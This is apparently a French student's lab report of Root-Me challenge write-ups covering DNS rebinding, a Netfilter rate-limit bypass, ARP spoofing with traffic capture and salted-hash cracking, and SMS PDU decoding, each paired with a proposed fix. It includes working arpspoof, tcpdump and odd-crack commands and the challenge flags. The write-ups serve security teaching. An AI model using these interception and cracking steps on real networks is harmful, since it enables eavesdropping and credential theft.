# TP6 : Un peu de root-me

## I. DNS Rebinding

### 🌞 Write-up de l'épreuve

Dans cette épreuve, nous allons utiliser le site [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html), qui permet de générer un hostname pour tester la vulnérabilité DNS Rebinding sur un site. Voici les étapes à suivre :

1. On entre une IP privée en **IP A**, comme `127.0.0.1`, et une IP publique en **IP B**, comme `8.8.8.8`.
2. Le site génère alors le hostname `7f000001.08080808.rbndr.us`.
3. Dans la barre de recherche, on saisit l'URL `http://7f000001.08080808.rbndr.us:54022/admin` pour accéder à la page admin sur le bon port.
4. Après quelques clics sur le bouton de recherche, nous obtenons enfin le **flag** qui est `u1reSog00dWizDNSR3bindindon` !

### 🌞 Proposer une version du code qui n'est pas vulnérable

Voici la version du code sans la vulnérabilité avec les correctifs suivants : 

1. **Injection de commandes via URL** :  
   L'utilisation de la fonction `urlparse` est maintenue mais renforcée avec des vérifications supplémentaires sur les entrées, notamment la validation stricte des domaines.

2. **Open Redirects** :  
   Les redirections ne sont autorisées qu'après vérification de leur sécurité.

3. **Accès à `/admin`** :  
   L'accès est sécurisé pour s'assurer que seules les IP autorisées et les tokens valides peuvent y accéder.

4. **Protection contre les attaques XSS** :  
   Échappement systématique des données de l'utilisateur pour éviter les injections.

Voici le code corrigé :
```
#!/usr/bin/env python3
#coding: utf-8
 
import re, html, ipaddress, socket, requests, random, string, flask, sys
from urllib.parse import urlparse

FLAG = ""+open(".passwd").readlines()[0].strip()+""
AUTHORIZED_IPS = ['127.0.0.1', '::1', '::ffff:127.0.0.1']
AUTH_TOKEN = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(42))

random.seed(FLAG)
app = flask.Flask(__name__, static_url_path='/static')

### Super secure checks
def valid_ip(ip):
    try:
        result = ipaddress.ip_address(ip)
        return result.is_global # Not a LAN address
    except Exception:
        return False

def valid_fqdn(fqdn):
    try:
        ip = socket.gethostbyname(fqdn)
        return valid_ip(ip)
    except Exception:
        return False

def sanitize_url(url):
    """Sanitize and validate the URL"""
    parsed = urlparse(url)
    if not parsed.scheme in ['http', 'https']:
        return None
    if not parsed.hostname or not valid_fqdn(parsed.hostname):
        return None
    return url

def get_url(url, recursion):
    try:
        r = requests.get(url, allow_redirects=False, timeout=5, headers={'rm-token': AUTH_TOKEN})
    except Exception:
        return '''
            <html>
                <head>
                    <title>Error</title>
                </head>
                <body>
                    <img src="%s"/>
                </body>
            </html>
        ''' % (flask.url_for('static', filename='no_idea.jpg'),)
    
    if 'location' in r.headers and recursion <= 1:
        redirect_url = sanitize_url(r.headers['location'])
        if redirect_url:
            return get_url(redirect_url, recursion + 1)
    return html.escape(r.text)

@app.route('/admin')
def admin():
    if flask.request.remote_addr not in AUTHORIZED_IPS or 'rm-token' not in flask.request.headers or flask.request.headers['rm-token'] != AUTH_TOKEN:
        return '''
            <html>
                <head>
                    <title>Not the admin page</title>
                    <link rel="stylesheet" href="/static/bootstrap.min.css">
                </head>
                <body style="background:black">
                    <div class="d-flex justify-content-center">
                        <img src="%s"/>
                    </div>
                </body>
            </html>
        ''' % (flask.url_for('static', filename='magicword_jurassic.jpg'),)
    return '''
        <html>
            <head>
                <title>Admin page</title>
                <link rel="stylesheet" href="/static/bootstrap.min.css">
            </head>
            <body style="background:pink">
                <br/>
                <h1 class="d-flex justify-content-center">Well done!</h1>
                <h3 class="d-flex justify-content-center">Have a cookie. Admins love cookies.</h1>
                <h6 class="d-flex justify-content-center">Flag: %s</h6>
                <div class="d-flex justify-content-center">
                    <img src="%s"/>
                </div>
            </body>
        </html>
    ''' % (html.escape(FLAG), flask.url_for('static', filename='cookie.png'),)

@app.route('/grab')
def grab():
    url = flask.request.args.get('url', '').strip()
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    sanitized_url = sanitize_url(url)
    if not sanitized_url:
        return '''
            <html>
                <head>
                    <title>Nope</title>
                </head>
                <body>
                    <img src="%s"/>
                </body>
            </html>
        ''' % (flask.url_for('static', filename='wow-so-clever.jpg'),)
    return get_url(sanitized_url, 0)

@app.route('/')
def index():
    return '''
        <!DOCTYPE html>
        <html>
            <head>
                <title>URL Grabber v42</title>
                <link rel="stylesheet" href="/static/bootstrap.min.css">
                <script src="/static/vue.min.js"></script>
            </head>
            <body style="height: 100vh;">
                <div id="app" class="container" style="height: 100%">
                    <br/>
                    <h1 class="d-flex justify-content-center">Mega super URL grabber</h1>
                    <h3 class="d-flex justify-content-center">\o/</h3>
                    <br/>
                    <h6 class="d-flex justify-content-center">Please be aware that I'm a nice tool, I don't grab pages that forbid me to frame them!</h3>
                    <h6 class="d-flex justify-content-center"><span>Also keep out of my <a href="/admin">/admin</a> page (it's only accessible from localhost anyway...)</span></h6>
                    <br/>
                    <br/>
                    <div class="input-group input-group-lg mb-3">
                        <input name="searchie" class="form-control">
                        <div class="input-group-append">
                            <button onclick="grab()" class="btn btn-primary">graby-grabo?</button>
                        </div>
                    </div>
                    <iframe name='framie' srcdoc="<html>Try me I'm famous</html>" width="100%" height="50%"></iframe>
                </div>
                <script>
                    var grab = function () {
                        fetch('/grab?url=' + encodeURIComponent(this.document.getElementsByName('searchie')[0].value))
                        .then((r) => r.text())
                        .then((r) => {
                            this.document.getElementsByName('framie')[0].setAttribute('srcdoc',r);
                        })
                    };
                </script>
            </body>
        </html>
    '''

@app.errorhandler(404)
def page_not_found(e):
    return "Nope. You are lost. Nothing here but me. The forever alone 404 page that no one ever want to see."
```
## II. Netfilter erreurs courantes
### 🌞 Write-up de l'épreuve

En arrivant sur le site, nous remarquons la présence d'un script situé en bas à droite de la page.
Après avoir analysé ce script, nous découvrons qu'il contient un ensemble de règles, dont une particulièrement intéressante : 
```bash
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP
```
Cette règle indique qu'il existe une limitation sur le nombre de requêtes HTTP pouvant être envoyées. Si le nombre de requêtes dépasse un certain seuil, elles seront rejetées.
On constate que si l'on n'envoie pas assez de paquets, nos requêtes sont bloquées. L'objectif est donc d'envoyer suffisamment de requêtes pour dépasser la limite et contourner cette restriction.
Pour ce faire, nous créons un script [spam.sh](./spam.sh) qui utilise la commande `curl` pour envoyer un grand nombre de requêtes en rafale. Le script spamme ainsi le serveur pour dépasser la limite imposée.
Une fois le script lancé avec ./[spam.sh](./spam.sh), nous parvenons à envoyer suffisamment de requêtes pour dépasser la limite et obtenir le flag.

Finalement, le flag obtenu est : saperlipopete

### 🌞 Proposer un jeu de règles firewall
Pour même éviter le ddos, on va accepter maximum 20 paquets par secondes, puis juste après on DROP tout :
```bash
IP46T -A INPUT-HTTP -m limit --limit 20/sec --limit-burst 20 -j ACCEPT
IP46T -A INPUT-HTTP -j DROP
```
## III. ARP Spoofing Ecoute active
### 🌞 Write-up de l'épreuve

1. **Connexion en SSH et changement de mot de passe**  
   On commence par se connecter en SSH et changer le mot de passe avec la commande `passwd`.

2. **Mise à jour et installation des outils**  
   Ensuite, on met à jour les paquets avec `apt update`. On télécharge ensuite les outils nécessaires : `tcpdump`, `dsniff`, et `nmap`.

3. **Scan du réseau avec `nmap`**  
   Exécution de la commande pour récupérer l'IP locale :  
   ```bash
   root@fac50de5d760:~# hostname -I
   172.18.0.2
   ```
   Puis, on scanne le réseau avec nmap :
   ```bash
   root@fac50de5d760:~# nmap 172.18.0.0/24
    Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-20 22:13 UTC
    Nmap scan report for 172.18.0.1
    Host is up (0.000036s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    MAC Address: 02:42:1C:61:A6:41 (Unknown)

    Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.3)
    Host is up (0.000047s latency).
    All 1000 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.3)   are closed
    MAC Address: 02:42:AC:12:00:03 (Unknown)

    Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
    Host is up (0.000043s latency).
    Not shown: 999 closed ports
    PORT     STATE SERVICE
    3306/tcp open  mysql
    MAC Address: 02:42:AC:12:00:04 (Unknown)

    Nmap scan report for fac50de5d760 (172.18.0.2)
    Host is up (0.000019s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh

    Nmap done: 256 IP addresses (4 hosts up) scanned in 2.47 seconds
   ```
   On remarque que les adresses IP qui nous intéressent sont `172.18.0.3` et `172.18.0.4`.

4. **ARP Poisoning**  
   On effectue un ARP poisoning entre les deux machines avec les commandes suivantes :  
   ```bash
   arpspoof -t 172.18.0.3 -r 172.18.0.4
   arpspoof -t 172.18.0.4 -r 172.18.0.3
   ```
5. **Capture des paquets avec `tcpdump`**  
   On capture les paquets entre les deux machines avec la commande :  
   ```bash
   tcpdump host 172.18.0.3 and host 172.18.0.4 -w capture.pcap
   ```
    Ensuite, on transfère le fichier `.pcap` sur notre PC pour l'analyser avec Wireshark.

6. **Analyse avec Wireshark**  
   Dans l'analyse des paquets, on trouve un message qui nous donne la première partie du flag : `l1tter4lly_4_c4ptur3_th3_fl4g`

7. **Récupération du deuxième flag**  
    On récupère deux "salt" et un mot de passe grâce à la capture. On utilise ensuite un outil pour déchiffrer le mot de passe : [odd-hash](https://github.com/kazkansouh/odd-hash).

    - On récupère les deux "salt" en hexadécimal.
    - On télécharge la wordlist `rockyou.txt` depuis [GitHub](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).

    On exécute la commande suivante :  
    ```bash
    nanouche@Ubuntu:~/Documents$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:1f55591e630a4a16581b4a4643485f5c3b350125 rockyou.txt 9983d5702a2e58fa4e61b304c861c4367c4194cb
    [*] loading file...
    [*] found heyheyhey=9983d5702a2e58fa4e61b304c861c4367c4194cb
    [*] all hashes found, shutdown requested
    [*] done, tried 4700 passwords
    ```
    Le flag complet est donc : `l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey` !
## 🌞 Proposer une configuration pour empêcher votre attaque
On configure une entrée ARP statique sur les 2 machines pour empêcher le ARP Poisonnning avec la commande :
```bash
sudo ip n add <adresse_ip> lladdr <adresse_mac> dev <interface>
```
### IV. Bonus : Trafic Global System for Mobile communications
## ⭐ BONUS : Write-up de l'épreuve

L'épreuve consiste à analyser un fichier **PCAP** (Packet Capture) qui, à première vue, semble illisible. Cependant, en examinant les détails de la capture, on s'aperçoit qu'il s'agit d'une capture provenant d'un téléphone, et qu'il faut déchiffrer les données contenues dans ce fichier pour trouver un message caché.

### Étapes de Décodage :

1. **Téléchargement et analyse du fichier PCAP :**
   - On commence par télécharger le fichier PCAP qui est fourni dans le cadre de l'épreuve. À l'ouverture, on constate que les données sont sous un format difficilement compréhensible. Cela peut être dû à l'encodage ou à un protocole spécifique utilisé pour la transmission des données.

2. **Identification d'une trame particulière :**
   - En analysant les différentes trames dans la capture, une trame se distingue des autres. Celle-ci a une longueur de 72 octets (length = 72), ce qui attire notre attention. Cela peut signifier qu'il y a un message caché ou un format particulier dans cette trame.

3. **Décodage avec un outil en ligne :**
   - Pour décoder cette trame, on utilise un **décodeur SMS PDU** en ligne. L'outil choisi est disponible à l'adresse suivante : [https://www.diafaan.com/sms-tutorials/gsm-modem-tutorial/online-sms-pdu-decoder/](https://www.diafaan.com/sms-tutorials/gsm-modem-tutorial/online-sms-pdu-decoder/).
   
4. **Format attendu pour l'analyse :**
   - En consultant un exemple sur l'outil en ligne, on remarque que le format des données à analyser doit commencer par `0791`. Le contenu de notre trame est le suivant :
     ```
     00ff9c0402030201ffff0b5a0791233010210068040b917120336603f800002140206165028047c7f79b0c52bfc52c101d5d0699d9e133283d0785e764f87b6da7956bb7f82d2c8b
     ```
   
5. **Décodage de la trame :**
   - En vérifiant la trame, on remarque qu'elle commence bien par `0791`, ce qui correspond au format attendu. Nous supprimons donc tout ce qui précède ce préfixe dans le décodeur.
   - Une fois cette modification effectuée et la trame correctement insérée dans l'outil de décodage, nous obtenons le message suivant :
     ```
     Good job, the flag is asdpokv4e57q7a2 !
     ```